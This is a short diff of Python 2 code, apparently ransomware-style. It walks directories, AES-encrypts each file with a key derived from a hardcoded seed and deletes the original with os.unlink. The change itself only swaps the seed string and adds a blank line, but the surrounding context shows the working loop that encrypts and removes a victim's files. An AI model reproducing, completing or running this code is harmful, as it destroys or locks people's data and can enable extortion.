@@ -41,6 +41,7 @@ def encrypt_file(password,filename):
                 elif len(chunk_read) % 16 != 0:
                     chunk_read += ' ' * (16 - (len(chunk_read) % 16))
                 outputfile_handler.write(encryptor.encrypt(chunk_read))
+
     os.unlink(filename) #original file is deleted
 
 
@@ -50,5 +51,5 @@ for paths in path:
         for names in files:
             print names+'\r'
             print root+'\r'
-            encrypt_file(SHA256.new("null_byte").digest(),str(os.path.join(root,names)))
+            encrypt_file(SHA256.new("this_is_the_seed").digest(),str(os.path.join(root,names)))
 
